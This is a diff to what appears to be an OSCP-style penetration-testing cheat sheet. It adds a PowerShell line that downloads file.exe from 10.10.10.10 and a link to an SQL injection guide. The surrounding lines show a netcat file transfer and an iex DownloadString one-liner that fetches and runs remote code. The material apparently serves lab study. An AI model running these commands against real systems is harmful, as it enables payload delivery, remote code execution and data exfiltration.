@@ -30,7 +30,8 @@ nc -w 5 10.10.14.18 4445 < /usr/local/bin/ovrflw
 
 iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/file')  
 Invoke-WebRequest "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
-Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
+Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe" 
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "C:\Users\Public\Documents\file.exe")  
 
 Interactive shell:
 --------------------------------------------------
@@ -72,4 +73,5 @@ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  //Linux Priv
 https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html  //Reverse Shells  
 https://www.fuzzysecurity.com/tutorials/16.html  //WindowsPrivEsc   
 https://refabr1k.gitbook.io/oscp/reverse-shell  //StudyNotes  
+https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html  //SQLTips  
 
